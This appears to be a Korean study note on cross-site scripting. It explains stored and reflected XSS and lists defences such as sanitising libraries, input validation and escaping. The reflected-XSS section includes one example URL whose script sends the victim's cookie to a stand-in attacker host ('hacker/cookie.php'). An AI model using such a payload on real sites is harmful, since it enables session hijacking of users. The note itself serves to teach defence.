# XSS(Cross-Site Scripting)
`XSS`는 Cross-Site Scripting의 약어로, 공격자가 공격하려는 웹사이트에 스크립트를 삽입하여 사용자의 웹 브라우저에서 해당 코드가 실행되도록 하는 공격 기법이다.
따라서 사용자가 의도하지 않은 행동을 수행시키거나, 쿠키나 세션 토큰 등의 민감한 정보를 탈취하여 세션 하이재킹(Session Hijacking) 공격으로 악용될 수 있다.

### XSS 공격 종류 및 기법
1. Stored XSS(또는 Persistent XSS)
- 사이트 게시판이나 댓글, 닉네임 등 스크립트가 서버에 저장되어 지속적으로 실행되는 방식이다.<br>
- 'Cross-Site Scripting' 이름에서 알 수 있듯이 대부분 자바스크립트를 사용하여 공격이 이뤄지며, SQL Injection과 같이 공격 기법이 비교적 단순하고 기초적이지만 많은 웹사이트가 XSS에 대한 방어 조치가 미비하기에 발생한다.

```
<script>악성 스크립트</script>
```
- 먼저 공격자가 웹 애플리케이션 상에서 XSS 취약점이 있는 곳을 파악하고, 위와 같은 형식의 악성 스크립트를 삽입한다.<br> 
삽입된 악성 스크립트는 데이터베이스에 저장되고, 악성 스크립트가 저장된 게시글 등을 열람한 사용자들은 악성 스크립트가 작동함에 따라 쿠키나 세션 등의 민감 정보를 탈취당하거나 다른 웹사이트로 리다이렉션될 수도 있다.

2. Reflected XSS
- Stored XSS와 달리, 사용자에게 입력받은 값을 서버에서 되돌려 주는 곳에서 발행하는 반사형 공격 기법이다.<br>
  보통 GET 방식을 사용하는 URL 파라미터에 악성 스크립트를 삽입하여 서버에 저장하지 않고 즉각적으로 스크립트를 만드는 방식이다.
- 일반적으로 공격자가 악성 스크립트와 함께 URL을 사용자에게 누르도록 유도하고, URL을 누른 사용자는 악성 스크립트가 실행됨에 따라 공격을 당하게 된다.
- 예시로, GET 방식으로 검색 기능을 구현한 웹 애플리케이션에 XSS 취약점이 존재하는 것을 확인한 공격자는 다음과 같이 검색 인자로 작성한 스크립트를 URL과 함께 사용자에게 전송한다.
```
http://testweb?search=&amp;lt;script&amp;gt;location.href(&quot;http://hacker/cookie.php?value=&quot;+document.cookie);&amp;lt;/script&amp;gt;
```
- 위 URL을 누르게 되면 악성 스크립트가 작동을 해서 공격자의 웹 페이지로 사용자의 쿠키값이 전송된다.

### XSS 대응방안
1. XSS 방어 라이브러리 활용 및 브라우저 확장 앱 사용
- XSS를 막아주는 여러 라이브러리를 사용하면 손쉽게 XSS를 방어할 수 있다.
- XSS 라이브러리를 사용하는 것은 서버 단에서 개발자가 추가하는 것이다.
3. 입력값 검증 및 필터링 및 이스케이프 처리
- 사용자로부터의 입력값을 검증하고, 허용되지 않는 문자나 코드를 필터링합니다.<br>
  정규 표현식이나 라이브러리를 활용하여 태그나 스크립트와 관련된 코드를 차단하거나 이스케이프 처리합니다.
